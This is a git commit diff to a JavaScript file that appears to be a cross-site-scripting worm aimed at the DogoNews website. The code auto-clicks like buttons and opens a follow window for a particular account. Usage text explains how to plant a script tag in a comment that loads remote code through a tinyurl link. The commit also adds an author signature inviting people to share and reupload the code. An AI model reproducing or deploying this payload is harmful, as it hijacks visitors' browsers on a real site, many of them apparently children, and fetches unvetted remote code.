337c4403476a727577ff2b6be02bc4ff3184b0bb
ComputerCandy <thomas.kool.12@gmail.com>
2017-02-10 20:50:39 +1300

    Updated Signature

--- js.js
+++ js.js
@@ -1,3 +1,4 @@
+<script src="https://tinyurl.com/j39dsb4"> </script>
 $(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click(); //Auto Like!
 
 var myPopup = window.open('https://www.dogonews.com/i/imarebel/follow'); //Open follow window
@@ -9,6 +10,19 @@ Breaks Any DogoNews page:
 <script src="https://tinyurl.com/j39dsb4" class="xss">run()</script>
 Just comment it with a message after and watch the magic!
 
---Share--
+--Signature--
+Origional Author:
 @HacksNeedFatKids#9617 on Discord
+12 Years of age.
+Author Currently:
+@HacksNeedFatKids#9617 on Discord
+12 Years of age.
+
+
+This code is free to use free of charge. You can share it, Copy it & re upload it.
+Just make sure that this signature is kept.
+--Credits--
+My Friend Seth, For trying to get people to follow him on DogoNews
+My Friend Josh, For telling me Seth's goal
+Me, For writing the source :D
 */
